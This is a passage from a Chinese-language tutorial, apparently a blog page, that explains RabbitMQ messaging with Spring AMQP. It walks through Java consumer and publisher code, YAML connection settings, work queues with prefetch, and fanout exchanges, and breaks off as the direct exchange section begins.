class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.helloworld;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsumerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        <span class="comment">// 1.建立连接</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">// 1.1.设置连接参数，分别是：主机名、端口号、vhost、用户名、密码</span></span><br><span class="line">        factory.setHost(<span class="string">&quot;192.168.150.101&quot;</span>);</span><br><span class="line">        factory.setPort(<span class="number">5672</span>);</span><br><span class="line">        factory.setVirtualHost(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        factory.setUsername(<span class="string">&quot;itcast&quot;</span>);</span><br><span class="line">        factory.setPassword(<span class="string">&quot;123321&quot;</span>);</span><br><span class="line">        <span class="comment">// 1.2.建立连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">// 2.创建通道Channel</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line">        <span class="comment">// 3.创建队列</span></span><br><span class="line">        String queueName = <span class="string">&quot;simple.queue&quot;</span>;</span><br><span class="line">        channel.queueDeclare(queueName, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 4.订阅消息</span></span><br><span class="line">        channel.basicConsume(queueName, <span class="keyword">true</span>, <span class="keyword">new</span> DefaultConsumer(channel)&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       AMQP.BasicProperties properties, <span class="keyword">byte</span>[] body)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                <span class="comment">// 5.处理消息</span></span><br><span class="line">                String message = <span class="keyword">new</span> String(body);</span><br><span class="line">                System.out.println(<span class="string">&quot;接收到消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;等待接收消息。。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="qBU7O"></a></p><h2 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5.总结"></a>2.5.总结</h2><p>基本消息队列的消息发送流程：</p><ol><li>建立connection</li><li>创建channel</li><li>利用channel声明队列</li><li>利用channel向队列发送消息</li></ol><p>基本消息队列的消息接收流程：</p><ol><li>建立connection</li><li>创建channel</li><li>利用channel声明队列</li><li>定义consumer的消费行为handleDelivery()</li><li>利用channel将消费者与队列绑定<br><a name="VVz3G"></a><h1 id="3-SpringAMQP"><a href="#3-SpringAMQP" class="headerlink" title="3.SpringAMQP"></a>3.SpringAMQP</h1>SpringAMQP是基于RabbitMQ封装的一套模板，并且还利用SpringBoot对其实现了自动装配，使用起来非常方便。<br />SpringAmqp的官方地址：<a href="https://spring.io/projects/spring-amqp">https://spring.io/projects/spring-amqp</a><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787451-72dee171-3ecd-46e2-b098-a05b68db0ca6.png#averageHue=%23eeeeee&crop=0&crop=0&crop=1&crop=1&id=DXBQE&originHeight=499&originWidth=797&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787527-cb46096b-aab7-4885-beb4-994fb00c84c6.png#averageHue=%23ededed&crop=0&crop=0&crop=1&crop=1&id=hBf4u&originHeight=453&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />SpringAMQP提供了三个功能：</li></ol><ul><li><p>自动声明队列、交换机及其绑定关系</p></li><li><p>基于注解的监听器模式，异步接收消息</p></li><li><p>封装了RabbitTemplate工具，用于发送消息<br><a name="VPYnW"></a></p><h2 id="3-1-Basic-Queue-简单队列模型"><a href="#3-1-Basic-Queue-简单队列模型" class="headerlink" title="3.1.Basic Queue 简单队列模型"></a>3.1.Basic Queue 简单队列模型</h2><p>在父工程mq-demo中引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--AMQP依赖，包含RabbitMQ--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="QttGI"></a></p><h3 id="3-1-1-消息发送"><a href="#3-1-1-消息发送" class="headerlink" title="3.1.1.消息发送"></a>3.1.1.消息发送</h3><p>首先配置MQ地址，在publisher服务的application.yml中添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.101</span> <span class="comment"># 主机名</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span> <span class="comment"># 端口</span></span><br><span class="line">    <span class="attr">virtual-host:</span> <span class="string">/</span> <span class="comment"># 虚拟主机</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">itcast</span> <span class="comment"># 用户名</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123321</span> <span class="comment"># 密码</span></span><br></pre></td></tr></table></figure><p>然后在publisher服务中编写测试类SpringAmqpTest，并利用RabbitTemplate实现消息发送：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.spring;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringAmqpTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RabbitTemplate rabbitTemplate;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSimpleQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 队列名称</span></span><br><span class="line">        String queueName = <span class="string">&quot;simple.queue&quot;</span>;</span><br><span class="line">        <span class="comment">// 消息</span></span><br><span class="line">        String message = <span class="string">&quot;hello, spring amqp!&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送消息</span></span><br><span class="line">        rabbitTemplate.convertAndSend(queueName, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="lqD7e"></a></p><h3 id="3-1-2-消息接收"><a href="#3-1-2-消息接收" class="headerlink" title="3.1.2.消息接收"></a>3.1.2.消息接收</h3><p>首先配置MQ地址，在consumer服务的application.yml中添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.101</span> <span class="comment"># 主机名</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span> <span class="comment"># 端口</span></span><br><span class="line">    <span class="attr">virtual-host:</span> <span class="string">/</span> <span class="comment"># 虚拟主机</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">itcast</span> <span class="comment"># 用户名</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123321</span> <span class="comment"># 密码</span></span><br></pre></td></tr></table></figure><p>然后在consumer服务的<code>cn.itcast.mq.listener</code>包中新建一个类SpringRabbitListener，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.listener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringRabbitListener</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenSimpleQueueMessage</span><span class="params">(String msg)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;spring 消费者接收到消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="bi81Z"></a></p><h3 id="3-1-3-测试"><a href="#3-1-3-测试" class="headerlink" title="3.1.3.测试"></a>3.1.3.测试</h3><p>启动consumer服务，然后在publisher服务中运行测试代码，发送MQ消息<br><a name="y2Ocd"></a></p><h2 id="3-2-WorkQueue"><a href="#3-2-WorkQueue" class="headerlink" title="3.2.WorkQueue"></a>3.2.WorkQueue</h2><p>Work queues，也被称为（Task queues），任务模型。简单来说就是<strong>让多个消费者绑定到一个队列，共同消费队列中的消息</strong>。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787605-9d2eff6e-6a64-413a-9509-7a5377fee1d2.png#averageHue=%23fdfafa&crop=0&crop=0&crop=1&crop=1&id=iSaeo&originHeight=471&originWidth=1253&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />当消息处理比较耗时的时候，可能生产消息的速度会远远大于消息的消费速度。长此以往，消息就会堆积越来越多，无法及时处理。<br />此时就可以使用work 模型，多个消费者共同处理消息处理，速度就能大大提高了。<br><a name="yJv4d"></a></p><h3 id="3-2-1-消息发送"><a href="#3-2-1-消息发送" class="headerlink" title="3.2.1.消息发送"></a>3.2.1.消息发送</h3><p>这次我们循环发送，模拟大量消息堆积现象。<br />在publisher服务中的SpringAmqpTest类中添加一个测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * workQueue</span></span><br><span class="line"><span class="comment">     * 向队列中不停发送消息，模拟消息堆积。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testWorkQueue</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="comment">// 队列名称</span></span><br><span class="line">    String queueName = <span class="string">&quot;simple.queue&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    String message = <span class="string">&quot;hello, message_&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 发送消息</span></span><br><span class="line">        rabbitTemplate.convertAndSend(queueName, message + i);</span><br><span class="line">        Thread.sleep(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="dcex7"></a></p><h3 id="3-2-2-消息接收"><a href="#3-2-2-消息接收" class="headerlink" title="3.2.2.消息接收"></a>3.2.2.消息接收</h3><p>要模拟多个消费者绑定同一个队列，我们在consumer服务的SpringRabbitListener中添加2个新的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenWorkQueue1</span><span class="params">(String msg)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者1接收到消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span> + LocalTime.now());</span><br><span class="line">    Thread.sleep(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenWorkQueue2</span><span class="params">(String msg)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    System.err.println(<span class="string">&quot;消费者2........接收到消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span> + LocalTime.now());</span><br><span class="line">    Thread.sleep(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这个消费者sleep了1000秒，模拟任务耗时。<br><a name="S3N47"></a></p><h3 id="3-2-3-测试"><a href="#3-2-3-测试" class="headerlink" title="3.2.3.测试"></a>3.2.3.测试</h3><p>启动ConsumerApplication后，在执行publisher服务中刚刚编写的发送测试方法testWorkQueue。<br />可以看到消费者1很快完成了自己的25条消息。消费者2却在缓慢的处理自己的25条消息。<br />也就是说消息是平均分配给每个消费者，并没有考虑到消费者的处理能力。这样显然是有问题的。<br><a name="Rqsrd"></a></p><h3 id="3-2-4-能者多劳"><a href="#3-2-4-能者多劳" class="headerlink" title="3.2.4.能者多劳"></a>3.2.4.能者多劳</h3><p>在spring中有一个简单的配置，可以解决这个问题。我们修改consumer服务的application.yml文件，添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="attr">simple:</span></span><br><span class="line">        <span class="attr">prefetch:</span> <span class="number">1</span> <span class="comment"># 每次只能获取一条消息，处理完成才能获取下一个消息</span></span><br></pre></td></tr></table></figure><p><a name="CMhwi"></a></p><h3 id="3-2-5-总结"><a href="#3-2-5-总结" class="headerlink" title="3.2.5.总结"></a>3.2.5.总结</h3><p>Work模型的使用：</p></li><li><p>多个消费者绑定到一个队列，同一条消息只会被一个消费者处理</p></li><li><p>通过设置prefetch来控制消费者预取的消息数量<br><a name="Vjep9"></a></p><h2 id="3-3-发布-订阅"><a href="#3-3-发布-订阅" class="headerlink" title="3.3.发布/订阅"></a>3.3.发布/订阅</h2><p>发布订阅的模型如图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787681-4aeb1677-7204-4ad4-8527-0df956d43573.png#averageHue=%23fcf7f7&crop=0&crop=0&crop=1&crop=1&id=e81wW&originHeight=462&originWidth=1431&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以看到，在订阅模型中，多了一个exchange角色，而且过程略有变化：</p></li><li><p>Publisher：生产者，也就是要发送消息的程序，但是不再发送到队列中，而是发给X（交换机）</p></li><li><p>Exchange：交换机，图中的X。一方面，接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于Exchange的类型。Exchange有以下3种类型：</p><ul><li>Fanout：广播，将消息交给所有绑定到交换机的队列</li><li>Direct：定向，把消息交给符合指定routing key 的队列</li><li>Topic：通配符，把消息交给符合routing pattern（路由模式） 的队列</li></ul></li><li><p>Consumer：消费者，与以前一样，订阅队列，没有变化</p></li><li><p>Queue：消息队列也与以前一样，接收消息、缓存消息。</p></li></ul><p><strong>Exchange（交换机）只负责转发消息，不具备存储消息的能力</strong>，因此如果没有任何队列与Exchange绑定，或者没有符合路由规则的队列，那么消息会丢失！<br><a name="yGXsj"></a></p><h2 id="3-4-Fanout"><a href="#3-4-Fanout" class="headerlink" title="3.4.Fanout"></a>3.4.Fanout</h2><p>Fanout，英文翻译是扇出，我觉得在MQ中叫广播更合适。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787762-a73eeff1-b2d6-4549-9fb2-5406a6c2eee3.png#averageHue=%23fcf6f6&crop=0&crop=0&crop=1&crop=1&id=uR1Vd&originHeight=431&originWidth=1416&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在广播模式下，消息发送流程是这样的：</p><ul><li>1）  可以有多个队列</li><li>2）  每个队列都要绑定到Exchange（交换机）</li><li>3）  生产者发送的消息，只能发送到交换机，交换机来决定要发给哪个队列，生产者无法决定</li><li>4）  交换机把消息发送给绑定过的所有队列</li><li>5）  订阅队列的消费者都能拿到消息</li></ul><p>我们的计划是这样的：</p><ul><li>创建一个交换机 itcast.fanout，类型是Fanout</li><li>创建两个队列fanout.queue1和fanout.queue2，绑定到交换机itcast.fanout</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787843-757ef8b9-af77-4a7b-9279-be6dd1ba6dc3.png#averageHue=%23faf4f4&crop=0&crop=0&crop=1&crop=1&id=crdxG&originHeight=265&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="F3BJ3"></a></p><h3 id="3-4-1-声明队列和交换机"><a href="#3-4-1-声明队列和交换机" class="headerlink" title="3.4.1.声明队列和交换机"></a>3.4.1.声明队列和交换机</h3><p>Spring提供了一个接口Exchange，来表示所有不同类型的交换机：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787931-230738f8-6723-4ae1-9111-64e027bca438.png#averageHue=%23ecf3e4&crop=0&crop=0&crop=1&crop=1&id=rQnLa&originHeight=332&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在consumer中创建一个类，声明队列和交换机：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.config;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.Binding;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.BindingBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.FanoutExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.Queue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FanoutConfig</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明交换机</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Fanout类型交换机</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FanoutExchange <span class="title">fanoutExchange</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FanoutExchange(<span class="string">&quot;itcast.fanout&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 第1个队列</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Queue <span class="title">fanoutQueue1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Queue(<span class="string">&quot;fanout.queue1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 绑定队列和交换机</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Binding <span class="title">bindingQueue1</span><span class="params">(Queue fanoutQueue1, FanoutExchange fanoutExchange)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(fanoutQueue1).to(fanoutExchange);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 第2个队列</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Queue <span class="title">fanoutQueue2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Queue(<span class="string">&quot;fanout.queue2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 绑定队列和交换机</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Binding <span class="title">bindingQueue2</span><span class="params">(Queue fanoutQueue2, FanoutExchange fanoutExchange)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(fanoutQueue2).to(fanoutExchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="y22gD"></a></p><h3 id="3-4-2-消息发送"><a href="#3-4-2-消息发送" class="headerlink" title="3.4.2.消息发送"></a>3.4.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFanoutExchange</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 队列名称</span></span><br><span class="line">    String exchangeName = <span class="string">&quot;itcast.fanout&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    String message = <span class="string">&quot;hello, everyone!&quot;</span>;</span><br><span class="line">    rabbitTemplate.convertAndSend(exchangeName, <span class="string">&quot;&quot;</span>, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="KP2F9"></a></p><h3 id="3-4-3-消息接收"><a href="#3-4-3-消息接收" class="headerlink" title="3.4.3.消息接收"></a>3.4.3.消息接收</h3><p>在consumer服务的SpringRabbitListener中添加两个方法，作为消费者：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(queues = &quot;fanout.queue1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenFanoutQueue1</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者1接收到Fanout消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RabbitListener(queues = &quot;fanout.queue2&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenFanoutQueue2</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者2接收到Fanout消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="InRp8"></a></p><h3 id="3-4-4-总结"><a href="#3-4-4-总结" class="headerlink" title="3.4.4.总结"></a>3.4.4.总结</h3><p>交换机的作用是什么？</p><ul><li>接收publisher发送的消息</li><li>将消息按照规则路由到与之绑定的队列</li><li>不能缓存消息，路由失败，消息丢失</li><li>FanoutExchange的会将消息路由到每个绑定的队列</li></ul><p>声明队列、交换机、绑定关系的Bean是什么？</p><ul><li><p>Queue</p></li><li><p>FanoutExchange</p></li><li><p>Binding<br><a name="XbUES"></a></p><h2 id="3-5-Direct"><a href="#3-5-Direct" class="headerlink" title="3.5.Direct"></a>3.5.Direct</h2><p>在Fanout模式中，一条消息，会被所有订阅的队列都消费。但是，在某些场景下，我们希望不同的消息被不同的队列消费。这时就要用到Direct类型的Exchange。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788019-955e2d17-01d7-45b3-8d6f-62a8313177a4.png#averageHue=%23fcf5f5&crop=0&crop=0&crop=1&crop=1&id=yOiFA&originHeight=494&originWidth=1611&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在Direct模型下：</p></li><li><p>队列与交换机的绑定，不能是任意绑定了，而是要指定一个<code>RoutingKey</code>（路由key）</p></li><li><p>消息的发送方在 向 Exchange发送消息时，也必须指定消息的 <code>RoutingKey</code>。</p></li><li><p>Exchange不再把消息交给每一个绑定的队列，而是根据消息的<code>Routing Key</code>进行判断，只有队列的<code>Routingkey</code>与消息的 <code>Routing key</code>完全一致，才会接收到消息</p></li></ul><p><strong>案例需求如下</strong>：</p><ol><li>利用@RabbitListener声明Exchange、Queue、RoutingKey</li><li>在consumer服务中，编写两个消费者方法，分别监听direct.queue1和direct.queue2</li><li>在publisher中编写测试方法，向itcast. direct发送消息</li></ol><p><img 